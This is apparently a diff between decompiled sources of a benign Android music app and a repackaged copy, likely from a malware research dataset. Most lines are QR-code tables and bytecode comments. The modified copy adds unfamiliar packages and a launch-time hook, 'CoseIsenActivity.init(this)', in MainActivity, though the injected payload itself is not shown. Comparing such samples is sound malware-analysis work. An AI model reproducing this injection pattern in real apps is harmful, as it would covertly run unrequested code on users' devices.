+>     int[] arrayOfInt21 = { 6, 28, 54, 80, 106, -1, -1 };
+>     int[] arrayOfInt22 = { 6, 32, 58, 84, 110, -1, -1 };
+>     int[] arrayOfInt23 = { 6, 30, 58, 86, 114, -1, -1 };
+>     int[] arrayOfInt24 = { 6, 26, 50, 74, 98, 122, -1 };
+>     int[] arrayOfInt25 = { 6, 30, 54, 78, 102, 126, -1 };
+>     int[] arrayOfInt26 = { 6, 26, 52, 78, 104, 130, -1 };
+>     int[] arrayOfInt27 = { 6, 30, 56, 82, 108, 134, -1 };
+>     int[] arrayOfInt28 = { 6, 34, 62, 90, 118, 146, -1 };
+>     int[] arrayOfInt29 = { 6, 30, 54, 78, 102, 126, 150 };
+>     int[] arrayOfInt30 = { 6, 24, 50, 76, 102, 128, 154 };
+>     int[] arrayOfInt31 = { 6, 28, 54, 80, 106, 132, 158 };
+>     int[] arrayOfInt32 = { 6, 32, 58, 84, 110, 136, 162 };
+>     int[] arrayOfInt33 = { 6, 26, 54, 82, 110, 138, 166 };
+>     int[] arrayOfInt34 = { 6, 30, 58, 86, 114, 142, 170 };
+>     POSITION_ADJUSTMENT_PATTERN_COORDINATE_TABLE = new int[][] { arrayOfInt1, arrayOfInt2, arrayOfInt3, arrayOfInt4, arrayOfInt5, arrayOfInt6, arrayOfInt7, arrayOfInt8, arrayOfInt9, arrayOfInt10, { 6, 30, 54, -1, -1, -1, -1 }, arrayOfInt11, arrayOfInt12, arrayOfInt13, arrayOfInt14, arrayOfInt15, { 6, 30, 54, 78, -1, -1, -1 }, arrayOfInt16, { 6, 30, 58, 86, -1, -1, -1 }, arrayOfInt17, arrayOfInt18, arrayOfInt19, arrayOfInt20, arrayOfInt21, arrayOfInt22, arrayOfInt23, { 6, 34, 62, 90, 118, -1, -1 }, arrayOfInt24, arrayOfInt25, arrayOfInt26, arrayOfInt27, { 6, 34, 60, 86, 112, 138, -1 }, { 6, 30, 58, 86, 114, 142, -1 }, arrayOfInt28, arrayOfInt29, arrayOfInt30, arrayOfInt31, arrayOfInt32, arrayOfInt33, arrayOfInt34 };
+38,47c64,77
+<     arrayOfInt2 = new int[] { 8, 4 };
+<     arrayOfInt3 = new int[] { 8, 5 };
+<     arrayOfInt4 = new int[] { 8, 7 };
+<     arrayOfInt5 = new int[] { 8, 8 };
+<     arrayOfInt6 = new int[] { 4, 8 };
+<     arrayOfInt7 = new int[] { 3, 8 };
+<     arrayOfInt8 = new int[] { 2, 8 };
+<     arrayOfInt9 = new int[] { 1, 8 };
+<     arrayOfInt10 = new int[] { 0, 8 };
+<     TYPE_INFO_COORDINATES = new int[][] { arrayOfInt1, { 8, 1 }, { 8, 2 }, { 8, 3 }, arrayOfInt2, arrayOfInt3, arrayOfInt4, arrayOfInt5, { 7, 8 }, { 5, 8 }, arrayOfInt6, arrayOfInt7, arrayOfInt8, arrayOfInt9, arrayOfInt10 };
+---
+>     arrayOfInt2 = new int[] { 8, 1 };
+>     arrayOfInt3 = new int[] { 8, 2 };
+>     arrayOfInt4 = new int[] { 8, 3 };
+>     arrayOfInt5 = new int[] { 8, 4 };
+>     arrayOfInt6 = new int[] { 8, 5 };
+>     arrayOfInt7 = new int[] { 8, 7 };
+>     arrayOfInt8 = new int[] { 8, 8 };
+>     arrayOfInt9 = new int[] { 7, 8 };
+>     arrayOfInt10 = new int[] { 4, 8 };
+>     arrayOfInt11 = new int[] { 3, 8 };
+>     arrayOfInt12 = new int[] { 2, 8 };
+>     arrayOfInt13 = new int[] { 1, 8 };
+>     arrayOfInt14 = new int[] { 0, 8 };
+>     TYPE_INFO_COORDINATES = new int[][] { arrayOfInt1, arrayOfInt2, arrayOfInt3, arrayOfInt4, arrayOfInt5, arrayOfInt6, arrayOfInt7, arrayOfInt8, arrayOfInt9, { 5, 8 }, arrayOfInt10, arrayOfInt11, arrayOfInt12, arrayOfInt13, arrayOfInt14 };
+Somente em result/APP_101/App_M_101/com: hunstun
+Somente em result/APP_101/App_M_101/com: luotuy
+diff -r result/APP_101/App_B_101/com/pipelineinteractive/pipeline/firedupdroid8b/MainActivity.java result/APP_101/App_M_101/com/pipelineinteractive/pipeline/firedupdroid8b/MainActivity.java
+9a10
+> import com.luotuy.mustn.CoseIsenActivity;
+33a35
+>     CoseIsenActivity.init(this);
+Somente em result/APP_101/App_M_101/com: sumase
+diff -r result/APP_101/App_B_101/fm/flycast/DPFileHandler.java result/APP_101/App_M_101/fm/flycast/DPFileHandler.java
+604,936c604,936
+<     //   133: istore_2
+<     //   134: iconst_0
+<     //   135: istore_3
+<     //   136: iload_3
+<     //   137: aload_1
+<     //   138: getfield 132	fm/flycast/DPXMLTracklist:children	Ljava/util/Vector;
+<     //   141: invokevirtual 138	java/util/Vector:size	()I
+<     //   144: if_icmpge +31 -> 175
+<     //   147: iload_2
+<     //   148: istore 4
+<     //   150: aload_1
+<     //   151: getfield 132	fm/flycast/DPXMLTracklist:children	Ljava/util/Vector;
+<     //   154: iload_3
+<     //   155: invokevirtual 142	java/util/Vector:elementAt	(I)Ljava/lang/Object;
+<     //   158: checkcast 144	fm/flycast/DPXMLTrack
+<     //   161: getfield 161	fm/flycast/DPXMLTrack:cached	Z
+<     //   164: ifeq +679 -> 843
+<     //   167: iload_2
+<     //   168: iconst_1
+<     //   169: iadd
+<     //   170: istore 4
+<     //   172: goto +671 -> 843
+<     //   175: aload 6
+<     //   177: iload_2
+<     //   178: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   181: aload 6
+<     //   183: aload_1
+<     //   184: getfield 189	fm/flycast/DPXMLTracklist:stationid	I
+<     //   187: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   190: aload 6
+<     //   192: aload_1
+<     //   193: getfield 282	fm/flycast/DPXMLTracklist:timecode	J
+<     //   196: invokevirtual 452	java/io/DataOutputStream:writeLong	(J)V
+<     //   199: aload_0
+<     //   200: aload_1
+<     //   201: getfield 287	fm/flycast/DPXMLTracklist:station	Ljava/lang/String;
+<     //   204: aload 6
+<     //   206: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   209: aload 6
+<     //   211: aload_1
+<     //   212: getfield 293	fm/flycast/DPXMLTracklist:shuffleable	Z
+<     //   215: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   218: aload 6
+<     //   220: aload_1
+<     //   221: getfield 296	fm/flycast/DPXMLTracklist:deleteable	Z
+<     //   224: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   227: aload 6
+<     //   229: aload_1
+<     //   230: getfield 299	fm/flycast/DPXMLTracklist:autoshuffle	Z
+<     //   233: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   236: aload 6
+<     //   238: aload_1
+<     //   239: getfield 302	fm/flycast/DPXMLTracklist:autohide	Z
+<     //   242: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   245: iconst_0
+<     //   246: istore_2
+<     //   247: iload_2
+<     //   248: aload_1
+<     //   249: getfield 132	fm/flycast/DPXMLTracklist:children	Ljava/util/Vector;
+<     //   252: invokevirtual 138	java/util/Vector:size	()I
+<     //   255: if_icmpge +454 -> 709
+<     //   258: aload_1
+<     //   259: getfield 132	fm/flycast/DPXMLTracklist:children	Ljava/util/Vector;
+<     //   262: iload_2
+<     //   263: invokevirtual 142	java/util/Vector:elementAt	(I)Ljava/lang/Object;
+<     //   266: checkcast 144	fm/flycast/DPXMLTrack
+<     //   269: astore 7
+<     //   271: aload 7
+<     //   273: getfield 161	fm/flycast/DPXMLTrack:cached	Z
+<     //   276: ifeq +369 -> 645
+<     //   279: aload_0
+<     //   280: aload 7
+<     //   282: getfield 309	fm/flycast/DPXMLTrack:artist	Ljava/lang/String;
+<     //   285: aload 6
+<     //   287: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   290: aload_0
+<     //   291: aload 7
+<     //   293: getfield 312	fm/flycast/DPXMLTrack:title	Ljava/lang/String;
+<     //   296: aload 6
+<     //   298: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   301: aload_0
+<     //   302: aload 7
+<     //   304: getfield 315	fm/flycast/DPXMLTrack:album	Ljava/lang/String;
+<     //   307: aload 6
+<     //   309: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   312: aload_0
+<     //   313: aload 7
+<     //   315: getfield 318	fm/flycast/DPXMLTrack:metadata	Ljava/lang/String;
+<     //   318: aload 6
+<     //   320: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   323: aload_0
+<     //   324: aload 7
+<     //   326: getfield 321	fm/flycast/DPXMLTrack:imageurl	Ljava/lang/String;
+<     //   329: aload 6
+<     //   331: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   334: aload_0
+<     //   335: aload 7
+<     //   337: getfield 324	fm/flycast/DPXMLTrack:mediaurl	Ljava/lang/String;
+<     //   340: aload 6
+<     //   342: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   345: aload_0
+<     //   346: aload 7
+<     //   348: getfield 327	fm/flycast/DPXMLTrack:redirect	Ljava/lang/String;
+<     //   351: aload 6
+<     //   353: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   356: aload_0
+<     //   357: aload 7
+<     //   359: getfield 330	fm/flycast/DPXMLTrack:mediatype	Ljava/lang/String;
+<     //   362: aload 6
+<     //   364: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   367: aload_0
+<     //   368: aload 7
+<     //   370: getfield 333	fm/flycast/DPXMLTrack:starttime	Ljava/lang/String;
+<     //   373: aload 6
+<     //   375: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   378: aload_0
+<     //   379: aload 7
+<     //   381: getfield 147	fm/flycast/DPXMLTrack:guidIndex	Ljava/lang/String;
+<     //   384: aload 6
+<     //   386: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   389: aload_0
+<     //   390: aload 7
+<     //   392: getfield 235	fm/flycast/DPXMLTrack:guidSong	Ljava/lang/String;
+<     //   395: aload 6
+<     //   397: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   400: aload 6
+<     //   402: aload 7
+<     //   404: getfield 334	fm/flycast/DPXMLTrack:timecode	J
+<     //   407: invokevirtual 452	java/io/DataOutputStream:writeLong	(J)V
+<     //   410: aload 6
+<     //   412: aload 7
+<     //   414: getfield 337	fm/flycast/DPXMLTrack:offset	I
+<     //   417: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   420: aload 6
+<     //   422: aload 7
+<     //   424: getfield 340	fm/flycast/DPXMLTrack:length	I
+<     //   427: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   430: aload 6
+<     //   432: aload 7
+<     //   434: getfield 343	fm/flycast/DPXMLTrack:current	I
+<     //   437: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   440: aload 6
+<     //   442: aload 7
+<     //   444: getfield 346	fm/flycast/DPXMLTrack:start	I
+<     //   447: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   450: aload 6
+<     //   452: aload 7
+<     //   454: getfield 349	fm/flycast/DPXMLTrack:bitrate	I
+<     //   457: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   460: aload 6
+<     //   462: aload 7
+<     //   464: getfield 164	fm/flycast/DPXMLTrack:seconds	I
+<     //   467: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   470: aload 6
+<     //   472: aload 7
+<     //   474: getfield 350	fm/flycast/DPXMLTrack:stationid	I
+<     //   477: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   480: aload 6
+<     //   482: aload 7
+<     //   484: getfield 353	fm/flycast/DPXMLTrack:buffered	Z
+<     //   487: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   490: aload 6
+<     //   492: aload 7
+<     //   494: getfield 161	fm/flycast/DPXMLTrack:cached	Z
+<     //   497: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   500: aload 6
+<     //   502: aload 7
+<     //   504: getfield 356	fm/flycast/DPXMLTrack:covered	Z
+<     //   507: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   510: aload 6
+<     //   512: aload 7
+<     //   514: getfield 359	fm/flycast/DPXMLTrack:flyback	Z
+<     //   517: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   520: aload 6
+<     //   522: aload 7
+<     //   524: getfield 362	fm/flycast/DPXMLTrack:listened	Z
+<     //   527: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   530: aload 6
+<     //   532: aload 7
+<     //   534: getfield 365	fm/flycast/DPXMLTrack:played	Z
+<     //   537: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   540: aload 6
+<     //   542: aload 7
+<     //   544: getfield 368	fm/flycast/DPXMLTrack:expdays	I
+<     //   547: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   550: aload 6
+<     //   552: aload 7
+<     //   554: getfield 371	fm/flycast/DPXMLTrack:expplays	I
+<     //   557: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   560: aload 6
+<     //   562: aload 7
+<     //   564: getfield 374	fm/flycast/DPXMLTrack:numplay	I
+<     //   567: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   570: aload 6
+<     //   572: aload 7
+<     //   574: getfield 377	fm/flycast/DPXMLTrack:clickAd	Z
+<     //   577: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   580: aload 6
+<     //   582: aload 7
+<     //   584: getfield 380	fm/flycast/DPXMLTrack:audioAd	Z
+<     //   587: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   590: aload 6
+<     //   592: aload 7
+<     //   594: getfield 383	fm/flycast/DPXMLTrack:reloadAd	Z
+<     //   597: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   600: aload_0
+<     //   601: aload 7
+<     //   603: getfield 386	fm/flycast/DPXMLTrack:addart	Ljava/lang/String;
+<     //   606: aload 6
+<     //   608: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   611: aload_0
+<     //   612: aload 7
+<     //   614: getfield 389	fm/flycast/DPXMLTrack:adurl	Ljava/lang/String;
+<     //   617: aload 6
+<     //   619: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+<     //   622: aload 6
+<     //   624: aload 7
+<     //   626: getfield 392	fm/flycast/DPXMLTrack:synced	Z
+<     //   629: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+<     //   632: aload 6
+<     //   634: aload 7
+<     //   636: getfield 395	fm/flycast/DPXMLTrack:syncoff	I
+<     //   639: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+<     //   642: goto +211 -> 853
+<     //   645: aload_1
+<     //   646: getfield 132	fm/flycast/DPXMLTracklist:children	Ljava/util/Vector;
+<     //   649: iload_2
+<     //   650: invokevirtual 463	java/util/Vector:remove	(I)Ljava/lang/Object;
+<     //   653: pop
+<     //   654: goto +199 -> 853
+<     //   657: astore_1
+<     //   658: aload 6
+<     //   660: astore 7
+<     //   662: aload 5
+<     //   664: astore 6
+<     //   666: getstatic 96	java/lang/System:err	Ljava/io/PrintStream;
+<     //   669: new 29	java/lang/StringBuilder
+<     //   672: dup
+<     //   673: invokespecial 30	java/lang/StringBuilder:<init>	()V
+<     //   676: getstatic 99	fm/flycast/DPStringConstants:STR_EXCEPTION	Ljava/lang/String;
+<     //   679: invokevirtual 39	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
+<     //   682: ldc_w 465
+<     //   685: invokevirtual 39	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
+<     //   688: aload_1
+<     //   689: invokevirtual 104	java/lang/Exception:getMessage	()Ljava/lang/String;
+<     //   692: invokevirtual 39	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
+<     //   695: invokevirtual 43	java/lang/StringBuilder:toString	()Ljava/lang/String;
+<     //   698: invokevirtual 109	java/io/PrintStream:println	(Ljava/lang/String;)V
+<     //   701: new 467	java/lang/NullPointerException
+<     //   704: dup
+<     //   705: invokespecial 468	java/lang/NullPointerException:<init>	()V
+<     //   708: athrow
+<     //   709: aload 5
+<     //   711: invokevirtual 469	java/io/FileOutputStream:close	()V
+<     //   714: aload 6
+<     //   716: invokevirtual 470	java/io/DataOutputStream:close	()V
+<     //   719: aload_1
+<     //   720: areturn
+<     //   721: astore 5
+<     //   723: aload 5
+<     //   725: invokevirtual 471	java/io/IOException:printStackTrace	()V
+<     //   728: aload_1
+<     //   729: areturn
+<     //   730: astore_1
+<     //   731: aload_1
+<     //   732: invokevirtual 471	java/io/IOException:printStackTrace	()V
+<     //   735: aconst_null
+<     //   736: areturn
+<     //   737: astore 5
+<     //   739: aload 6
+<     //   741: astore_1
+<     //   742: aload_1
+<     //   743: invokevirtual 469	java/io/FileOutputStream:close	()V
+<     //   746: aload 7
+<     //   748: invokevirtual 470	java/io/DataOutputStream:close	()V
+<     //   751: aload 5
+<     //   753: athrow
+<     //   754: astore_1
+<     //   755: aload_1
+<     //   756: invokevirtual 471	java/io/IOException:printStackTrace	()V
+<     //   759: goto -8 -> 751
+<     //   762: astore 5
+<     //   764: aload 11
+<     //   766: astore_1
+<     //   767: aload 9
+<     //   769: astore 7
+<     //   771: goto -29 -> 742
+<     //   774: astore 6
+<     //   776: aload 5
+<     //   778: astore_1
+<     //   779: aload 9
+<     //   781: astore 7
+<     //   783: aload 6
+<     //   785: astore 5
+<     //   787: goto -45 -> 742
+<     //   790: astore 8
+<     //   792: aload 5
+<     //   794: astore_1
+<     //   795: aload 6
+<     //   797: astore 7
+<     //   799: aload 8
+<     //   801: astore 5
+<     //   803: goto -61 -> 742
+<     //   806: astore_1
+<     //   807: aload 10
+<     //   809: astore 5
+<     //   811: aload 8
+<     //   813: astore 7
+<     //   815: goto -153 -> 662
+<     //   818: astore_1
+<     //   819: aload 10
+<     //   821: astore 5
+<     //   823: aload 8
+<     //   825: astore 7
+<     //   827: goto -165 -> 662
+<     //   830: astore_1
+<     //   831: aload 8
+<     //   833: astore 7
+<     //   835: goto -173 -> 662
+<     //   838: astore 5
+<     //   840: goto -117 -> 723
+<     //   843: iload_3
+<     //   844: iconst_1
+<     //   845: iadd
+<     //   846: istore_3
+<     //   847: iload 4
+<     //   849: istore_2
+<     //   850: goto -714 -> 136
+<     //   853: iload_2
+<     //   854: iconst_1
+<     //   855: iadd
+<     //   856: istore_2
+<     //   857: goto -610 -> 247
+---
+>     //   133: istore 4
+>     //   135: iconst_0
+>     //   136: istore_3
+>     //   137: iload_3
+>     //   138: aload_1
+>     //   139: getfield 132	fm/flycast/DPXMLTracklist:children	Ljava/util/Vector;
+>     //   142: invokevirtual 138	java/util/Vector:size	()I
+>     //   145: if_icmpge +31 -> 176
+>     //   148: iload 4
+>     //   150: istore_2
+>     //   151: aload_1
+>     //   152: getfield 132	fm/flycast/DPXMLTracklist:children	Ljava/util/Vector;
+>     //   155: iload_3
+>     //   156: invokevirtual 142	java/util/Vector:elementAt	(I)Ljava/lang/Object;
+>     //   159: checkcast 144	fm/flycast/DPXMLTrack
+>     //   162: getfield 161	fm/flycast/DPXMLTrack:cached	Z
+>     //   165: ifeq +680 -> 845
+>     //   168: iload 4
+>     //   170: iconst_1
+>     //   171: iadd
+>     //   172: istore_2
+>     //   173: goto +672 -> 845
+>     //   176: aload 6
+>     //   178: iload 4
+>     //   180: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   183: aload 6
+>     //   185: aload_1
+>     //   186: getfield 189	fm/flycast/DPXMLTracklist:stationid	I
+>     //   189: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   192: aload 6
+>     //   194: aload_1
+>     //   195: getfield 282	fm/flycast/DPXMLTracklist:timecode	J
+>     //   198: invokevirtual 452	java/io/DataOutputStream:writeLong	(J)V
+>     //   201: aload_0
+>     //   202: aload_1
+>     //   203: getfield 287	fm/flycast/DPXMLTracklist:station	Ljava/lang/String;
+>     //   206: aload 6
+>     //   208: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   211: aload 6
+>     //   213: aload_1
+>     //   214: getfield 293	fm/flycast/DPXMLTracklist:shuffleable	Z
+>     //   217: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   220: aload 6
+>     //   222: aload_1
+>     //   223: getfield 296	fm/flycast/DPXMLTracklist:deleteable	Z
+>     //   226: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   229: aload 6
+>     //   231: aload_1
+>     //   232: getfield 299	fm/flycast/DPXMLTracklist:autoshuffle	Z
+>     //   235: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   238: aload 6
+>     //   240: aload_1
+>     //   241: getfield 302	fm/flycast/DPXMLTracklist:autohide	Z
+>     //   244: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   247: iconst_0
+>     //   248: istore_2
+>     //   249: iload_2
+>     //   250: aload_1
+>     //   251: getfield 132	fm/flycast/DPXMLTracklist:children	Ljava/util/Vector;
+>     //   254: invokevirtual 138	java/util/Vector:size	()I
+>     //   257: if_icmpge +454 -> 711
+>     //   260: aload_1
+>     //   261: getfield 132	fm/flycast/DPXMLTracklist:children	Ljava/util/Vector;
+>     //   264: iload_2
+>     //   265: invokevirtual 142	java/util/Vector:elementAt	(I)Ljava/lang/Object;
+>     //   268: checkcast 144	fm/flycast/DPXMLTrack
+>     //   271: astore 7
+>     //   273: aload 7
+>     //   275: getfield 161	fm/flycast/DPXMLTrack:cached	Z
+>     //   278: ifeq +369 -> 647
+>     //   281: aload_0
+>     //   282: aload 7
+>     //   284: getfield 309	fm/flycast/DPXMLTrack:artist	Ljava/lang/String;
+>     //   287: aload 6
+>     //   289: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   292: aload_0
+>     //   293: aload 7
+>     //   295: getfield 312	fm/flycast/DPXMLTrack:title	Ljava/lang/String;
+>     //   298: aload 6
+>     //   300: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   303: aload_0
+>     //   304: aload 7
+>     //   306: getfield 315	fm/flycast/DPXMLTrack:album	Ljava/lang/String;
+>     //   309: aload 6
+>     //   311: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   314: aload_0
+>     //   315: aload 7
+>     //   317: getfield 318	fm/flycast/DPXMLTrack:metadata	Ljava/lang/String;
+>     //   320: aload 6
+>     //   322: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   325: aload_0
+>     //   326: aload 7
+>     //   328: getfield 321	fm/flycast/DPXMLTrack:imageurl	Ljava/lang/String;
+>     //   331: aload 6
+>     //   333: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   336: aload_0
+>     //   337: aload 7
+>     //   339: getfield 324	fm/flycast/DPXMLTrack:mediaurl	Ljava/lang/String;
+>     //   342: aload 6
+>     //   344: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   347: aload_0
+>     //   348: aload 7
+>     //   350: getfield 327	fm/flycast/DPXMLTrack:redirect	Ljava/lang/String;
+>     //   353: aload 6
+>     //   355: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   358: aload_0
+>     //   359: aload 7
+>     //   361: getfield 330	fm/flycast/DPXMLTrack:mediatype	Ljava/lang/String;
+>     //   364: aload 6
+>     //   366: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   369: aload_0
+>     //   370: aload 7
+>     //   372: getfield 333	fm/flycast/DPXMLTrack:starttime	Ljava/lang/String;
+>     //   375: aload 6
+>     //   377: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   380: aload_0
+>     //   381: aload 7
+>     //   383: getfield 147	fm/flycast/DPXMLTrack:guidIndex	Ljava/lang/String;
+>     //   386: aload 6
+>     //   388: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   391: aload_0
+>     //   392: aload 7
+>     //   394: getfield 235	fm/flycast/DPXMLTrack:guidSong	Ljava/lang/String;
+>     //   397: aload 6
+>     //   399: invokevirtual 456	fm/flycast/DPFileHandler:writeString	(Ljava/lang/String;Ljava/io/DataOutputStream;)V
+>     //   402: aload 6
+>     //   404: aload 7
+>     //   406: getfield 334	fm/flycast/DPXMLTrack:timecode	J
+>     //   409: invokevirtual 452	java/io/DataOutputStream:writeLong	(J)V
+>     //   412: aload 6
+>     //   414: aload 7
+>     //   416: getfield 337	fm/flycast/DPXMLTrack:offset	I
+>     //   419: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   422: aload 6
+>     //   424: aload 7
+>     //   426: getfield 340	fm/flycast/DPXMLTrack:length	I
+>     //   429: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   432: aload 6
+>     //   434: aload 7
+>     //   436: getfield 343	fm/flycast/DPXMLTrack:current	I
+>     //   439: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   442: aload 6
+>     //   444: aload 7
+>     //   446: getfield 346	fm/flycast/DPXMLTrack:start	I
+>     //   449: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   452: aload 6
+>     //   454: aload 7
+>     //   456: getfield 349	fm/flycast/DPXMLTrack:bitrate	I
+>     //   459: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   462: aload 6
+>     //   464: aload 7
+>     //   466: getfield 164	fm/flycast/DPXMLTrack:seconds	I
+>     //   469: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   472: aload 6
+>     //   474: aload 7
+>     //   476: getfield 350	fm/flycast/DPXMLTrack:stationid	I
+>     //   479: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   482: aload 6
+>     //   484: aload 7
+>     //   486: getfield 353	fm/flycast/DPXMLTrack:buffered	Z
+>     //   489: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   492: aload 6
+>     //   494: aload 7
+>     //   496: getfield 161	fm/flycast/DPXMLTrack:cached	Z
+>     //   499: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   502: aload 6
+>     //   504: aload 7
+>     //   506: getfield 356	fm/flycast/DPXMLTrack:covered	Z
+>     //   509: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   512: aload 6
+>     //   514: aload 7
+>     //   516: getfield 359	fm/flycast/DPXMLTrack:flyback	Z
+>     //   519: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   522: aload 6
+>     //   524: aload 7
+>     //   526: getfield 362	fm/flycast/DPXMLTrack:listened	Z
+>     //   529: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   532: aload 6
+>     //   534: aload 7
+>     //   536: getfield 365	fm/flycast/DPXMLTrack:played	Z
+>     //   539: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   542: aload 6
+>     //   544: aload 7
+>     //   546: getfield 368	fm/flycast/DPXMLTrack:expdays	I
+>     //   549: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   552: aload 6
+>     //   554: aload 7
+>     //   556: getfield 371	fm/flycast/DPXMLTrack:expplays	I
+>     //   559: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   562: aload 6
+>     //   564: aload 7
+>     //   566: getfield 374	fm/flycast/DPXMLTrack:numplay	I
+>     //   569: invokevirtual 448	java/io/DataOutputStream:writeInt	(I)V
+>     //   572: aload 6
+>     //   574: aload 7
+>     //   576: getfield 377	fm/flycast/DPXMLTrack:clickAd	Z
+>     //   579: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   582: aload 6
+>     //   584: aload 7
+>     //   586: getfield 380	fm/flycast/DPXMLTrack:audioAd	Z
+>     //   589: invokevirtual 460	java/io/DataOutputStream:writeBoolean	(Z)V
+>     //   592: aload 6
+>     //   594: aload 7
+>     //   596: getfield 383	fm/flycast/DPXMLTrack:reloadAd	Z
